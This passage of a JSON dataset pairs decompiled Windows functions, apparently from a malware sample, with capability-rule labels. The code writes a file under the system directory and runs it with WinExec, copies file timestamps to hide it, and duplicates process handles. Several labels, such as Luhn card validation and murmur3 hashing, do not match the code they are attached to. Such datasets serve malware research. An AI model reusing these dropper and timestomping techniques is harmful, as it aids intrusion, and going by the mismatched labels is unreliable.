        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402050(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404ec0(0x407010);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "00402080": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004022fd) overlaps instruction at (ram,0x004022fc)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004022fd)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.00402080(uchar *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    uint32_t *puVar10;\n    uint16_t in_ES;\n    uchar uVar11;\n    uchar uVar12;\n    bool bVar13;\n    uint32_t in_stack_ffff9f71;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar4 = &stack0xfffffffc;\n    puVar6 = &var_213h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    s = 0;\n    puVar6 = &var_10fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    var_ch = 1;\n    puVar10 = puVar6 + 3;\n    *(puVar6 + 2) = 0;\n    uVar11 = 1;\n    uVar12 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puVar7 = arg_8h;\n    if ((!uVar11 && !uVar12) && (uVar11 || uVar12)) {\n        uVar12 = *0x10 == 0x239;\n        puVar7 = &s;\n    }\n    fcn.00403510(&var_4h, &var_8h);\n    if ((!uVar11 && !uVar12) && (uVar11 || uVar12)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar3 = fcn.00402a20(puVar7, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    iVar3 = fcn.00402cf0(&s, var_4h, var_8h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    fcn.00401fb0();\n    iVar3 = fcn.00404b80(0x407068);\n    if (iVar3 == -1) {\n        iVar3 = fcn.00404b80(0x40705c);\n        bVar13 = iVar3 == -1;\n        if (bVar13) goto code_r0x0040224a;\n    }\n    iVar3 = fcn.00403750(arg_8h);\n    if (iVar3 != 0) {\n        fcn.004027e0();\n        fcn.00403870();\n        return 1;\n    }\n    bVar13 = *0x423628 == 0;\n    if (bVar13) {\n        return 0;\n    }\ncode_r0x0040224a:\n    puVar6 = &stack0xfffffffc;\n    if ((!bVar13) && (puVar6 = &stack0xfffffffc,  bVar13)) {\n        puVar5 = &stack0xfffffdd0;\n        puVar6 = &stack0xfffffdd0;\n        cVar1 = '\\x10';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    uVar2 = fcn.00401130(arg_8h, puVar6 + -0x44);\n    if (uVar2 == 0) {\n        puVar7 = NULL;\n    }\n    else {\n        puVar7 = puVar6[-3];\n    }\n    bVar13 = puVar7 < 0;\n    if (puVar7 != NULL) {\n        uVar2 = fcn.00404b20(arg_8h);\n        bVar13 = uVar2 < 0;\n        if (uVar2 == 0) {\n            puVar6[-3] = 0;\n            puVar7 = uVar2;\n        }\n    }\n    if ((!bVar13) && (bVar13)) {\n        in_stack_ffff9f71 = in_stack_ffff9f71 & 0xffff0000 | in_ES;\n        puVar7 = puVar7 - 1;\n        pcVar9 = puVar10 | puVar6;\n        puVar10 = pcVar9 + 1;\n        *pcVar9 = uVar2;\n        uVar2 = uVar2 & 0xffff0000 | uVar2 + (uVar2 >> 8) * 'y';\n    }\n    bVar13 = false;\n    uVar8 = puVar7;\n    if (puVar7 == NULL) {\n        uVar2 = fcn.00401e20(arg_8h, in_stack_ffff9f71);\n        bVar13 = SCARRY4(&stack0xffff9f6d, 8);\n        puVar7 = &stack0xffff9f71;\n        puVar6[-3] = uVar2;\n        uVar8 = uVar2;\n    }\n    if ((bVar13 == puVar7 < 0) && (bVar13 != puVar7 < 0)) {\n        out(0xc4, uVar2);\n        *puVar10 = uVar2;\n    }\n    bVar13 = uVar8 != 0;\n    if (bVar13) {\n    // WARNING: Bad instruction - Truncating control flow here\n        fcn.00403870();\n    }\n    if ((bVar13 && *0x10 != 0x608f) && (!bVar13 || *0x10 == 0x608f)) {\n        puVar4 = &stack0xffff9f6d;\n        cVar1 = '\\x10';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *puVar6;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x40707c, 0);\n    return uVar8;\n}\n",
        "token_count": 1654
    },
    "00402ba0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402bc1) overlaps instruction at (ram,0x00402bbf)\n// \n\nbool fcn.00402ba0(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t unaff_EDI;\n    uint uStack8;\n    \n    puVar2 = &stack0xfffffffc;\n    uStack8 = 0x104;\n    if ((&stack0xfffffffc < 0x10c || *0x10 == 0x110) || (&stack0xfffffffc >= 0x10c && *0x10 != 0x110)) {\n        in_EAX = &uStack8;\n    }\n    else {\n        *(unaff_EDI + -0x73) = *(unaff_EDI + -0x73) - &stack0xfffffeec;\n        puVar2 = &stack0xfffffffd;\n    }\n    iVar1 = fcn.00403880(0x80000002, 0x4072f0, 0x407330, puVar2 + -8, puVar2 + -0x10c, in_EAX);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(puVar2 + -0x10c, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 315
    },
    "00402c20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c9d) overlaps instruction at (ram,0x00402c9c)\n// \n// WARNING: Removing unreachable block (ram,0x00402cd0)\n\nuint64_t __cdecl fcn.00402c20(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    char extraout_CH;\n    uint32_t uVar7;\n    uint extraout_EDX;\n    uint8_t *unaff_EBX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar8;\n    bool in_OF;\n    ulong uVar9;\n    uint64_t uVar10;\n    uint in_stack_0000000c;\n    uint in_stack_00000014;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_ESI = in_stack_00000014;\n        return CONCAT44(in_stack_0000000c, in_stack_00000014);\n    }\n    uVar9 = fcn.00404b80(0x40707c);\n    uVar7 = uVar9 >> 0x20;\n    bVar8 = uVar9 == 0xffffffff;\n    if (bVar8) {\n        return uVar7 << 0x20;\n    }\n    if ((!bVar8) && (bVar8)) {\n        uVar6 = in(uVar9 >> 0x20);\n        *unaff_EDI = uVar6;\n        if (&stack0xfffffff8 < 1) goto code_r0x00402ce1;\n    }\n    uVar3 = uVar9 ^ 0xdee0ed6d;\n    puVar1 = (uVar3 & 0xffff0000 | uVar3 + (uVar3 >> 8) * -0x31) + 0x6a;\n    *puVar1 = *puVar1 ^ uVar9 >> 0x20;\n    pcVar2 = uVar7 + 0x40;\n    *pcVar2 = *pcVar2 + extraout_CH;\n    uVar10 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    iVar4 = uVar10;\n    if (iVar4 == 0) {\n        return uVar10 & 0xffffffff00000000;\n    }\n    if ((iVar4 < 0) || (iVar5 = iVar4,  iVar4 >= 0)) {\n        iVar5 = arg_8h;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(iVar4, iVar5 + -0x1bf31dd6, 0, 0, 0);\n    uVar10 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar6);\n    if (uVar10 == 0) {\n        return uVar10 & 0xffffffff00000000;\n    }\ncode_r0x00402ce1:\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 717
    },
    "00402e00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402e00(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uint *puVar7;\n    bool bVar8;\n    char cVar9;\n    char cVar10;\n    char lpBuffer;\n    uint var_22bh;\n    uint var_128h;\n    uint var_24h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    \n    lpBuffer = '\\0';\n    var_128h._0_1_ = 0;\n    puVar4 = &var_22bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    cVar10 = '\\0';\n    cVar9 = '\\0';\n    bVar8 = true;\n    puVar4 = &var_128h + 1;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    if ((!bVar8 && cVar10 == cVar9) && (bVar8 || cVar10 != cVar9)) {\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        return 1;\n    }\n    uVar2 = 0xffffffff;\n    pcVar5 = &lpBuffer;\n    do {\n        pcVar6 = pcVar5;\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        pcVar6 = pcVar5 + 1;\n        cVar9 = *pcVar5;\n        pcVar5 = pcVar6;\n    } while (cVar9 != '\\0');\n    uVar2 = ~uVar2;\n    puVar4 = pcVar6 + -uVar2;\n    puVar7 = &var_128h;\n    for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar7 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar7 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    uVar2 = 0xffffffff;\n    pcVar5 = 0x407048;\n    do {\n        pcVar6 = pcVar5;\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        pcVar6 = pcVar5 + 1;\n        cVar9 = *pcVar5;\n        pcVar5 = pcVar6;\n    } while (cVar9 != '\\0');\n    uVar2 = ~uVar2;\n    iVar1 = -1;\n    puVar4 = &var_128h;\n    do {\n        puVar7 = puVar4;\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        puVar7 = puVar4 + 1;\n        cVar9 = *puVar4;\n        puVar4 = puVar7;\n    } while (cVar9 != '\\0');\n    puVar4 = pcVar6 + -uVar2;\n    puVar7 = puVar7 + -1;\n    for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar7 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar7 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_128h, 0, &var_24h);\n    iVar1 = arg_ch;\n    if ((arg_ch == -1) && (iVar1 = fcn.00404ec0(arg_8h),  iVar1 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar1, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return 1;\n}\n",
        "token_count": 1250
    },
    "00403780": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403780(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 87
    },
    "00403d10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403de0) overlaps instruction at (ram,0x00403dde)\n// \n\nbool fcn.00403d10(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint *puVar2;\n    ushort in_SS;\n    bool bVar3;\n    bool bVar4;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.004023c0();\n    if (iVar1 == 0) {\n        return false;\n    }\n    do {\n        fcn.00401d40();\n        iVar1 = fcn.00404b80(0x407074);\n        bVar3 = iVar1 != -1;\n        bVar4 = (POPCOUNT(iVar1 + 1U & 0xff) & 1U) == 0;\n        if (iVar1 + 1U != 0) {\n            return false;\n        }\n        fcn.00404510();\n        *0x42362c = 1;\n        if ((bVar4) || (!bVar4)) break;\n        segment(in_SS, *0x10 + -0x90);\n        var_20h = 0xa5;\n        if (bVar3) {\n            *(extraout_ECX + 7) = *(extraout_ECX + 7) >> (extraout_ECX & 0x1f);\n            iVar1 = extraout_ECX;\n            goto code_r0x00403de9;\n        }\n    } while (bVar4);\n    iVar1 = fcn.00402050();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    iVar1 = 7;\ncode_r0x00403de9:\n    puVar2 = &var_1fh;\n    for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_80h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_60h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.004039e0(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.00403120(&var_20h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.00402080(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar1 != 0;\n}\n",
        "token_count": 871
    },
    "00404b80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b80(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar uVar4;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x423630)(2, 0);\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar3 = &var_128h;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x423634)(iVar1, &var_12ch);\n    do {\n        if (iVar2 == 0) {\ncode_r0x00404c42:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        uVar4 = arg_8h >> 0x18;\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(0xf4, arg_8h);\n        if (iVar2 == 0) {\n            var_4h = var_124h;\n            goto code_r0x00404c42;\n        }\n        iVar2 = (**0x423638)(iVar1, 0xd0, uVar4);\n    } while( true );\n}\n",
        "token_count": 365
    },
    "00402810": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00402810(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42362c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00402fd0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e4, acStack1304, &uStack2112);\n    uStack2088 = 0x40736c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407384;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404c60(auStack1564, 0x4072e0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1869
    },
    "00402a20": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402b58) overlaps instruction at (ram,0x00402b56)\n// \n// WARNING: Removing unreachable block (ram,0x00402a7c)\n// WARNING: Removing unreachable block (ram,0x00402a67)\n// WARNING: Removing unreachable block (ram,0x00402aa7)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402a20(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t *extraout_ECX;\n    int32_t iVar4;\n    code *pcVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint8_t in_AF;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    var_4h = fcn.00401090(arg_18h, arg_1ch, 0x407054, 7);\n    pcVar5 = _sym.imp.MSVCRT.dll_rand;\n    if (var_4h == NULL) {\n        return 0;\n    }\n    var_24h = 0;\n    puVar6 = &var_23h;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    uVar7 = 0;\n    do {\n        uVar3 = (*pcVar5)();\n        uVar3 = uVar3 & 0x800000ff;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n        }\n        uVar2 = uVar3;\n        (&var_24h)[uVar7] = uVar2;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x20);\n    if ((uVar7 != 0x20) && (uVar7 == 0x20)) {\n        pcVar5 = pcVar5 + 1;\n        if (uVar7 < 0x20 || pcVar5 == NULL) {\n            *extraout_ECX = *extraout_ECX >> 0x15;\n            goto code_r0x00402b20;\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        piVar1 = (uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - pcVar5;\n    }\n    puVar6 = &var_24h;\n    puVar8 = var_4h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar8 = puVar8 + 1;\n    }\ncode_r0x00402b20:\n    fcn.00402480(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    fcn.004030a0(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 852
    },
    "00403040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403040(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00401000;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407490;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 216
    },
    "004037c0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004037c0(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    bool bVar1;\n    \n    bVar1 = arg_10h == 0;\n    while (!bVar1) {\n        arg_8h = arg_8h + *arg_ch;\n        if (arg_8h >> 0x10 != 0) {\n            arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n        }\n        arg_ch = arg_ch + 1;\n        arg_10h = arg_10h + -1;\n        bVar1 = arg_10h == 0;\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 186
    },
    "00404d90": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
